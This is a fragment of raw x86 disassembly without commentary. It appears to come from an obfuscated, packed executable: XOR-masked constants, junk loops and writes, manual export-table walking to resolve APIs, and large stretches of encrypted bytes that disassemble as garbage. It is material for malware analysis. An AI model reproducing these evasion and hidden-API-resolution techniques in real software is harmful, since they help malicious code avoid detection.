  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR ds:0xf9bcfdb4,ebx
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	(bad)  
  40d12f:	lods   al,BYTE PTR ds:[esi]
  40d130:	adc    bh,BYTE PTR [esi]
  40d132:	mov    edx,0x59219a91
  40d137:	mov    bl,0xeb
  40d139:	cmp    cl,BYTE PTR ds:0x39e5b5be
  40d13f:	ret    
  40d140:	loope  0x40d17f
  40d142:	scas   al,BYTE PTR es:[edi]
  40d143:	jne    0x40d175
  40d145:	rcr    ebx,0xe
  40d148:	aas    
  40d149:	adc    BYTE PTR [edx-0x64],ch
  40d14c:	push   ebp
  40d14d:	adc    DWORD PTR [esi+ebx*2],ecx
  40d150:	stos   BYTE PTR es:[edi],al
  40d151:	and    DWORD PTR [edx],ebx
  40d153:	mov    al,ds:0x4e55c431
  40d158:	out    0xc6,eax
  40d15a:	into   
  40d15b:	cwde   
  40d15c:	or     BYTE PTR [esi+eiz*8],dh
  40d15f:	(bad)  
  40d160:	scas   al,BYTE PTR es:[edi]
  40d161:	mov    ds:0xa67eadf2,al
  40d166:	stos   DWORD PTR es:[edi],eax
  40d167:	xor    ch,BYTE PTR [esi-0x6322b2ee]
  40d16d:	outs   dx,BYTE PTR ds:[esi]
  40d16e:	mov    bl,0x98
  40d170:	aad    0x54
  40d172:	js     0x40d1b5
  40d174:	push   esp
  40d175:	xchg   edi,eax
  40d176:	sti    
  40d177:	mov    edx,edi
  40d179:	and    al,0xa5
  40d17b:	cmp    eax,0xb4db5e1b
  40d180:	hlt    
  40d181:	mov    bl,0x8d
  40d183:	push   es
  40d184:	jmp    0x486d7446
  40d189:	mul    esi
  40d18b:	and    BYTE PTR [edi-0x2c5070da],0x62
  40d192:	xchg   DWORD PTR [ebx],edx
  40d194:	adc    al,0x4b
  40d196:	ins    DWORD PTR es:[edi],dx
  40d197:	push   ebp
  40d198:	fstp   QWORD PTR [eax-0x5a280dd2]
  40d19e:	repz mov bl,0x84
  40d1a1:	jmp    0x1179:0xcc9efa24
  40d1a8:	(bad)  
  40d1a9:	fnsave [ecx-0x10ade2aa]
  40d1af:	xor    al,0xea
  40d1b1:	or     esi,DWORD PTR [esp+ebp*8+0x71e02eb5]
  40d1b8:	hlt    
  40d1b9:	push   ebx
  40d1ba:	les    edx,FWORD PTR [edx+0x4]
  40d1bd:	aas    
  40d1be:	fimul  DWORD PTR [eax-0x2e0e34c8]
  40d1c4:	fwait
  40d1c5:	(bad)  
  40d1c6:	mov    ch,0xe0
  40d1c8:	loop   0x40d243
  40d1ca:	pop    eax
  40d1cb:	stc    
  40d1cc:	fistp  WORD PTR cs:[esi]
  40d1cf:	sub    BYTE PTR [eax],bh
  40d1d1:	sbb    ch,cl
  40d1d3:	sti    
  40d1d4:	(bad)
  40d1d7:	cmp    ch,BYTE PTR [edx+ebp*4+0x1cac0be9]
  40d1de:	sahf   
  40d1df:	add    DWORD PTR ds:0xc8330784,0x54
  40d1e6:	inc    eax
  40d1e7:	add    DWORD PTR [esi],eax
  40d1e9:	and    BYTE PTR [edx+edx*8+0x57],ch
  40d1ed:	and    ebx,DWORD PTR [edx]
  40d1ef:	cmp    dl,BYTE PTR [ecx]
  40d1f1:	xor    DWORD PTR [esi-0x71],esp
  40d1f4:	pop    edi
  40d1f5:	xchg   ebp,eax
  40d1f6:	mov    ch,0x70
  40d1f8:	sahf   
  40d1f9:	adc    eax,0x57f28fea
  40d1fe:	dec    esp
  40d1ff:	clc    
  40d200:	or     al,0x50
  40d202:	leave  
  40d203:	imul   eax,DWORD PTR [ebx],0x412e35f4
  40d209:	stc    
  40d20a:	mov    ebx,0x3fd8fc3b
  40d20f:	cwde   
  40d210:	mov    edi,0x5496b2c1
  40d215:	test   al,0xab
  40d217:	int3   
  40d218:	push   es
  40d219:	jne    0x40d24a
  40d21b:	or     DWORD PTR ds:0xbe25b7fe,ebx
  40d221:	inc    edx
  40d222:	out    dx,al
  40d223:	out    0x3e,al
  40d225:	add    al,0xb3
  40d227:	outs   dx,DWORD PTR ds:[esi]
  40d228:	dec    ecx
  40d229:	mov    edi,DWORD PTR [ebp+eax*2-0x69]
  40d22d:	add    esp,DWORD PTR [esi-0x1f]
  40d230:	mov    eax,ds:0x9e87388b
  40d235:	out    0xa4,al
  40d237:	aaa    
  40d238:	ja     0x40d216
  40d23a:	jecxz  0x40d1fd
  40d23c:	dec    ecx
  40d23d:	lds    edi,FWORD PTR [eax+esi*4]
  40d240:	cdq    
  40d241:	lahf   
  40d242:	ror    BYTE PTR [ebp-0xe],cl
  40d245:	mov    ebp,0x98be5e3e
  40d24a:	push   esi
  40d24b:	dec    esp
  40d24c:	int    0x3b
  40d24e:	xor    al,0x89
  40d250:	inc    edx
  40d251:	std    
  40d252:	xor    dl,BYTE PTR [edi+eiz*1]
  40d255:	push   ecx
  40d256:	push   DWORD PTR [eax-0x34fc8ccd]
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x406a8e30
  40d410:	mov    bl,BYTE PTR [ebp+0x7e8eade9]
  40d416:	jle    0x40d43a
  40d418:	jg     0x40d498
  40d41a:	jle    0x40d48e
  40d41c:	xor    bl,bh
  40d41e:	dec    esp
  40d41f:	jne    0x40d3ea
  40d421:	pop    ss
  40d422:	cmp    dl,bh
  40d424:	push   ebx
  40d425:	pop    ecx
  40d426:	mov    ecx,0x801c1570
  40d42b:	rol    BYTE PTR [eax+0x5a],cl
  40d42e:	mov    edx,esp
  40d430:	dec    ecx
  40d431:	popa   
  40d432:	loope  0x40d40a
  40d434:	jae    0x40d3b8
  40d436:	push   edi
  40d437:	pusha  
  40d438:	cmp    BYTE PTR [edx+0x5f6a901e],bl
  40d43e:	(bad)  
  40d43f:	push   ebp
  40d440:	retf   
  40d441:	(bad)  
  40d442:	out    0xfb,eax
  40d444:	dec    esp
  40d445:	dec    eax
  40d446:	push   edi
  40d447:	push   eax
  40d448:	pop    ss
  40d449:	or     al,0x1a
  40d44b:	frstor [esp+edi*2]
  40d44e:	out    0x23,al
  40d450:	(bad)  
  40d451:	sti    
  40d452:	call   0x1989:0xe6859f89
  40d459:	mov    bl,0xf1
  40d45b:	fistp  WORD PTR [esi]
  40d45d:	xor    BYTE PTR [edi+ebp*8-0x10b80f0e],dh
  40d464:	popf   
  40d465:	and    esi,DWORD PTR [edi]
  40d467:	loope  0x40d484
  40d469:	xchg   esp,eax
  40d46a:	sahf   
  40d46b:	(bad)  
  40d46c:	scas   al,BYTE PTR es:[edi]
  40d46d:	je     0x40d46c
  40d46f:	shl    BYTE PTR [edi-0x36],cl
  40d472:	cmp    bl,cl
  40d474:	xchg   esi,eax
  40d475:	or     ecx,DWORD PTR [ebx+0x25bd481a]
  40d47b:	and    bh,BYTE PTR [ecx+0xd]
  40d47e:	sub    ebp,DWORD PTR [ecx+0x31bb37e0]
  40d484:	sub    al,BYTE PTR [esi+0xba7a071]
  40d48a:	das    
  40d48b:	jns    0x40d420
  40d48d:	xor    edx,edx
  40d48f:	jge    0x40d421
  40d491:	jnp    0x40d43a
  40d493:	neg    DWORD PTR [ecx-0x2a]
  40d496:	lods   al,BYTE PTR ds:[esi]
  40d497:	stc    
  40d498:	adc    eax,0x9850283b
  40d49d:	pop    esp
  40d49e:	push   es
  40d49f:	mov    dl,0x4c
  40d4a1:	pop    ds
  40d4a2:	inc    edx
  40d4a3:	int    0xde
  40d4a5:	cmp    dl,0x8b
  40d4a8:	pop    ds
  40d4a9:	sbb    cl,bl
  40d4ab:	jmp    0x40d4be
  40d4ad:	push   ebp
  40d4ae:	jno    0x40d438
  40d4b0:	scas   al,BYTE PTR es:[edi]
  40d4b1:	mov    esi,0xc58a7726
  40d4b6:	fptan  
  40d4b8:	mov    ch,0x92
  40d4ba:	test   BYTE PTR [ecx-0x40],ah
  40d4bd:	push   DWORD PTR [eax]
  40d4bf:	ror    BYTE PTR ds:0xb8c82fa2,1
  40d4c5:	scas   eax,DWORD PTR es:[edi]
  40d4c6:	loope  0x40d4e4
  40d4c8:	sub    BYTE PTR ds:0xc7684286,0xf6
  40d4cf:	sub    ch,BYTE PTR [edi-0x57689f8d]
  40d4d5:	in     al,0x9d
  40d4d7:	jnp    0x40d492
  40d4d9:	leave  
  40d4da:	add    cl,ah
  40d4dc:	sbb    dl,BYTE PTR ds:0x9ebe269e
  40d4e2:	in     al,dx
  40d4e3:	inc    ebx
  40d4e4:	(bad)  
  40d4e5:	sahf   
  40d4e6:	sti    
  40d4e7:	jecxz  0x40d49e
  40d4e9:	mov    bh,0xba
  40d4eb:	pop    edi
  40d4ec:	add    ecx,DWORD PTR [esi+0x56]
  40d4ef:	cmp    eax,0xa92d1784
  40d4f4:	push   ds
  40d4f5:	(bad)  
  40d4f6:	jecxz  0x40d4f8
  40d4f8:	mov    edi,0xf71c330a
  40d4fd:	push   edi
  40d4fe:	mov    eax,ds:0x1642f4f
  40d503:	or     bl,bh
  40d505:	jnp    0x40d4fa
  40d507:	scas   al,BYTE PTR es:[edi]
  40d508:	cli    
  40d509:	sahf   
  40d50a:	xor    al,0x7d
  40d50c:	xchg   ebx,eax
  40d50d:	test   DWORD PTR [ebp-0x238d6eb],ecx
  40d513:	sahf   
  40d514:	ror    esp,0xab
  40d517:	jne    0x40d566
  40d519:	and    DWORD PTR [esp+edi*4+0x40],ebp
  40d51d:	mov    ebp,es
  40d51f:	xchg   esp,eax
  40d520:	or     BYTE PTR [eax+eax*1-0x61],bh
  40d524:	dec    eax
  40d525:	test   al,0x5d
  40d527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d528:	mov    ds:0x632d3214,eax
  40d52d:	sub    edi,eax
  40d52f:	mov    ebp,ecx
  40d531:	ss aad 0x21
  40d534:	mov    cl,BYTE PTR [ebp+0x66d4485d]
  40d53a:	xchg   ebp,eax
  40d53b:	jns    0x40d54c
  40d53d:	mov    ebp,DWORD PTR [esi-0x6b2084e5]
  40d543:	xchg   edi,eax
  40d544:	sbb    dh,BYTE PTR [eax+0xc75ff0c]
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	cmp    ah,dl
  40d5b9:	pop    ebp
  40d5ba:	jne    0x40d60d
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d63a
  40d5c4:	adc    BYTE PTR [ebx+0x5c],dh
  40d5c7:	fld    TBYTE PTR [eax-0x45]
  40d5ca:	rol    BYTE PTR [eax],1
  40d5cc:	in     al,0x50
  40d5ce:	outs   dx,BYTE PTR ds:[esi]
  40d5cf:	mov    esi,DWORD PTR [esi]
  40d5d1:	popf   
  40d5d2:	pop    ds
  40d5d3:	jb     0x40d590
  40d5d5:	fld    TBYTE PTR [edx-0x2f6085e7]
  40d5db:	mov    ds:0xf0fa17c5,eax
  40d5e0:	out    0x49,al
  40d5e2:	aad    0x14
  40d5e4:	jmp    DWORD PTR [edx]
  40d5e6:	mov    ebp,0x36316165
  40d5eb:	add    DWORD PTR es:[eax],ebx
  40d5ee:	pushf  
  40d5ef:	add    ebx,ecx
  40d5f1:	in     al,dx
  40d5f2:	pop    ss
  40d5f3:	cmp    ch,bl
  40d5f5:	mul    DWORD PTR [eax+ebx*2+0x32]
  40d5f9:	repz (bad) 
  40d5fb:	jo     0x40d614
  40d5fd:	call   0x5ef9:0xe1da405e
  40d604:	xlat   BYTE PTR ds:[ebx]
  40d605:	(bad)  
  40d606:	push   edx
  40d607:	rcl    BYTE PTR [ebx],1
  40d609:	outs   dx,BYTE PTR ds:[esi]
  40d60a:	outs   dx,DWORD PTR ds:[esi]
  40d60b:	sbb    al,0x8c
  40d60d:	mov    al,0x32
  40d60f:	mov    DWORD PTR [esi-0x7de5df2c],ebp
  40d615:	adc    al,0x71
  40d617:	jp     0x40d696
  40d619:	cmp    DWORD PTR [ebx],esi
  40d61b:	sub    eax,0xb9d4677b
  40d620:	push   edi
  40d621:	jmp    0xb8b01b6
  40d626:	dec    edi
  40d627:	push   es
  40d628:	xchg   ebp,eax
  40d629:	dec    esp
  40d62a:	xor    cl,BYTE PTR [edi]
  40d62c:	lahf   
  40d62d:	dec    ebp
  40d62e:	pop    edx
  40d62f:	stos   DWORD PTR es:[edi],eax
  40d630:	push   ds
  40d631:	lds    ecx,FWORD PTR [ecx-0x7dca0874]
  40d637:	popa   
  40d638:	lds    esp,FWORD PTR [edi-0xf]
  40d63b:	call   0x9b60:0x3c2d96a4
  40d642:	jmp    0xed9c:0xa9b92f89
  40d649:	shl    bl,cl
  40d64b:	mov    al,ds:0xae91dda9
  40d650:	fstp   DWORD PTR [ebx-0x2a]
  40d653:	in     al,dx
